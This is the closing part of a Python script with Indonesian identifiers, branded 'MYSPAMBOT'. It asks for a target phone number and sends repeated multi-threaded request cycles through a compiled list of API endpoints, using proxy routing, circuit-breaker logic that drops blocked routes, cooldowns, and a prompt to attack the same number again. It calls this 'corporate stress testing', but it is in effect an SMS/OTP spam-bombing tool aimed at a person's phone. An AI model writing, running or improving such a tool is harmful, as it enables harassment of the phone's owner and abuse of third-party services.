        print(f"{PaletWarnaCorporate.KUNING} INFRASTRUCTURE CORE : {PaletWarnaCorporate.HIJAU}Hyper-Scale Asynchronous Multi-Threading Engine Cluster")
        print(f"{PaletWarnaCorporate.KUNING} RECOGNIZED AUTHOR   : {PaletWarnaCorporate.HIJAU}R_x | Lead Architecture Systems Specialist")
        print(f"{PaletWarnaCorporate.KUNING} CREDENTIAL LICENSE  : {PaletWarnaCorporate.BIRU}Licensed under MIT Open-Source Enterprise Node Specifications")
        print(f"{PaletWarnaCorporate.ABU}="*85)

    @staticmethod
    def tampilkan_telemetri_akhir(t):
        print(f"\n{PaletWarnaCorporate.PUTIH}="*85)
        print(f"{PaletWarnaCorporate.UNGU}                    RINGKASAN AUDIT TELEMETRI KINERJA CLUSTER GATEWAY")
        print(f"{PaletWarnaCorporate.PUTIH}="*85)
        print(f"{PaletWarnaCorporate.HIJAU}[+] OPERASI LIVE BERHASIL (HTTP 2XX)   : {t.transaksi_sukses}")
        print(f"{PaletWarnaCorporate.MERAH}[-] BLOCKED CIRCUIT BREAK (HTTP 4XX)   : {t.blokir_server_40x} -> (Rute Terisolasi)")
        print(f"{PaletWarnaCorporate.KUNING}[-] RATE LIMIT EXCEEDED (HTTP 5XX)     : {t.overload_server_50x}")
        print(f"{PaletWarnaCorporate.MERAH}[-] JALUR WAKTU HABIS JARINGAN (RTO)   : {t.rto_jaringan} -> (Rute Terisolasi)")
        print(f"{PaletWarnaCorporate.BIRU}[*] KECEPATAN RESPONS RATA-RATA KANAL  : {t.dapatkan_rata_latensi_ms()} ms")
        print(f"{PaletWarnaCorporate.BIRU}[*] TOTAL MASI AKTIF RUNTIME FRAMEWORK : {t.kalkulasi_uptime()}")
        print(f"{PaletWarnaCorporate.PUTIH}="*85)

class ManajemenInterupsiSinyalOS:
    """Intersepsi tingkat rendah instruksi pemberhentian paksa OS (SIGINT/SIGTERM)."""
    def __init__(self, orkestrator_obj):
        self.orkestrator_obj = orkestrator_obj
        signal.signal(signal.SIGINT, self.eksekusi_graceful_shutdown)
        signal.signal(signal.SIGTERM, self.eksekusi_graceful_shutdown)

    def eksekusi_graceful_shutdown(self, signum, frame):
        print(f"\n\n{PaletWarnaCorporate.BG_MERAH}{PaletWarnaCorporate.PUTIH}[INTERUPSI OS] Menangkap Sinyal Penutupan {signum}. Menutup Seluruh Sub-Thread...{PaletWarnaCorporate.RESET}")
        self.orkestrator_obj.shutdown_signal.set()
        LogKinerjaKorporat.log_warning("Aplikasi dihentikan paksa melalui pemicu sinyal instruksi OS.")
        time.sleep(1.2)
        sys.exit(0)
def proses_orkestrasi_menyeluruh(nomor_pengujian):
    TerminalVisualDashboard.cetak_banner_perusahaan()
    
    # Inisialisasi Seluruh Driver Komponen Utama Korporat
    pengatur_json = DriverKonfigurasiJSON()
    monitor_telemetri = TelemetriMesinUtama()
    katup_sirkuit = KatupCircuitBreaker(pengatur_json.current_settings["circuit_breaker_max_failures"])
    manajer_proksi = RouterGerbangProksi()
    log_file_handler = LogKinerjaKorporat()
    
    cleaner = PembersihDataTarget(nomor_pengujian)
    if not cleaner.validasi_skema_telepon():
        print(f"\n{PaletWarnaCorporate.MERAH}[!] ERROR: Validasi skema nomor telepon gagal! Panjang karakter salah atau tidak didukung.{PaletWarnaCorporate.RESET}")
        time.sleep(2.0)
        return

    peta_format_nomor = cleaner.petakan_segmen_format()
    
    kompiler_api = KlusterPenyusunMatriksAPI(peta_format_nomor)
    antrean_global = kompiler_api.kompilasi_skema_node()
    
    mesin_utama = EngineOrkestratorUtama(peta_format_nomor["nol_bawaan"], pengatur_json, monitor_telemetri, katup_sirkuit, manajer_proksi)
    
    ManajemenInterupsiSinyalOS(mesin_utama)
    
    TerminalVisualDashboard.bersihkan_layar()
    MesinAnimasiTeks.gelombang_warna_pulsing("=== INITIALIZING HYPER-SCALE STRESS CORE ENGINE INJECTION ===", 2)
    MesinAnimasiTeks.efek_matrix_cyber(1.2)
    TerminalVisualDashboard.cetak_banner_perusahaan()
    
    print(f"{PaletWarnaCorporate.HIJAU}[+] Saluran Orkestrasi Diaktifkan Untuk Nomor Objek Target: {PaletWarnaCorporate.PUTIH}{peta_format_nomor['nol_bawaan']}{PaletWarnaCorporate.RESET}")
    print(f"{PaletWarnaCorporate.ABU}[INFO] Memuat {len(antrean_global)} Titik Kanal Distribusi API ke Virtual RAM. Status Proksi: {manajer_proksi.is_active}{PaletWarnaCorporate.RESET}")
    print(f"{PaletWarnaCorporate.ABU}[INFO] Memobilisasi {pengatur_json.current_settings['max_thread_workers']} Pekerja Thread Pool Paralel Simultan...{PaletWarnaCorporate.RESET}")
    time.sleep(1.5)

    from concurrent.futures import ThreadPoolExecutor, as_completed

    for siklus_ke in range(pengatur_json.current_settings["total_execution_cycles"]):
        if mesin_utama.shutdown_signal.is_set():
            break
            
        antrean_aktif_steril = mesin_utama.dapatkan_antrean_steril(antrean_global)
        if not antrean_aktif_steril:
            print(f"\n{PaletWarnaCorporate.MERAH}[ALERT] Semua Rute Node API Diblokir Total Oleh Circuit Breaker Sistem. Eksekusi Dibatalkan.{PaletWarnaCorporate.RESET}")
            break
            
        print(f"\n{PaletWarnaCorporate.UNGU}>>> [ SIKLUS UTAMA JALUR KE-{siklus_ke+1}/{pengatur_json.current_settings['total_execution_cycles']} - TOTAL KANAL SEHAT: {len(antrean_aktif_steril)} ] <<<{PaletWarnaCorporate.RESET}")
        time.sleep(0.5)

        with ThreadPoolExecutor(max_workers=pengatur_json.current_settings["max_thread_workers"]) as executor_pool:
            peta_pekerjaan = {executor_pool.submit(mesin_utama.operasikan_single_node, node): node for node in antrean_aktif_steril}
            
            for task_future in as_completed(peta_pekerjaan):
                if mesin_utama.shutdown_signal.is_set():
                    break
                respons_log_kamus = task_future.result()
                if respons_log_kamus:
                    print(respons_log_kamus["log"])
                    
        antrean_global = mesin_utama.dapatkan_antrean_steril(antrean_global)
        
        if siklus_ke + 1 < pengatur_json.current_settings["total_execution_cycles"] and not mesin_utama.shutdown_signal.is_set():
            print(f"\n{PaletWarnaCorporate.KUNING}[Siklus {siklus_ke+1} Rampung] Membuka katup pembersihan memori...")
            MesinAnimasiTeks.simulasi_loading_bar_pro(pengatur_json.current_settings["cooldown_duration_seconds"])

    TerminalVisualDashboard.tampilkan_telemetri_akhir(monitor_telemetri)
    
    eksportir_file = EksportirLaporanKorporat(log_file_handler.folder_dasar)
    if pengatur_json.current_settings["generate_csv_report"]:
        eksportir_file.ekspor_csv_audit(mesin_utama.audit_buffer)
    if pengatur_json.current_settings["generate_json_report"]:
        eksportir_file.ekspor_json_audit(mesin_utama.audit_buffer)
        
    LogKinerjaKorporat.log_info(f"Sesi pengujian infrastruktur diselesaikan secara sukses untuk target {peta_format_nomor['nol_bawaan']}.")
    dialog_opsi_perulangan(peta_format_nomor["nol_bawaan"])

def dialog_opsi_perulangan(nomor_sebelumnya):
    """Menyediakan gerbang keputusan interaktif untuk mengulang alur."""
    while True:
        try:
            pilihan_karakter = input(f"\n{PaletWarnaCorporate.UNGU}Apakah Anda ingin mengulangi prosedur stress pengujian pada target ini? (y/t) : {PaletWarnaCorporate.RESET}")
            if pilihan_karakter.lower() == 'y':
                proses_orkestrasi_menyeluruh(nomor_sebelumnya)
                break
            elif pilihan_karakter.lower() == 't':
                print(f"{PaletWarnaCorporate.HIJAU}[+] Terimakasih telah mempercayai Platform Corporate Automation Framework. Sistem dimatikan aman.{PaletWarnaCorporate.RESET}")
                sys.exit(0)
            else:
                print(f"{PaletWarnaCorporate.MERAH}[!] Input tidak valid. Tolong masukkan huruf 'y' atau 't' saja.{PaletWarnaCorporate.RESET}")
        except KeyboardInterrupt:
            print(f"\n{PaletWarnaCorporate.MERAH}[!] Sinyal penutupan instan diterima dari keyboard. Menutup paksa.{PaletWarnaCorporate.RESET}")
            sys.exit(0)
def main():
    try:
        TerminalVisualDashboard.cetak_banner_perusahaan()
        
        MesinAnimasiTeks.running_text_banner("WELCOME TO MYSPAMBOT CORPORATE SYSTEM ULTIMATE PLATFORM INTERFACE - DESIGNED BY R_x", 60, 1)
        print("\n")
        
        print(f"{PaletWarnaCorporate.PUTIH}Silakan masukkan nomor telepon target pengujian korporat di bawah ini:{PaletWarnaCorporate.RESET}")
        inputan_pengguna = input(f"{PaletWarnaCorporate.KUNING}Masukkan Nomor Ponsel Objek Pengujian (Contoh: 0812xxxxxx) : {PaletWarnaCorporate.HIJAU}")
        
        if not inputan_pengguna.strip():
            print(f"\n{PaletWarnaCorporate.MERAH}[!] Kegagalan Validasi: Input target tidak boleh kosong!{PaletWarnaCorporate.RESET}")
            time.sleep(1.5)
            sys.exit(1)
            
        proses_orkestrasi_menyeluruh(inputan_pengguna)
        
    except KeyboardInterrupt:
        print(f"\n{PaletWarnaCorporate.MERAH}\n[!] Terjadi interupsi pada menu utama. Menutup seluruh gerbang platform.{PaletWarnaCorporate.RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()
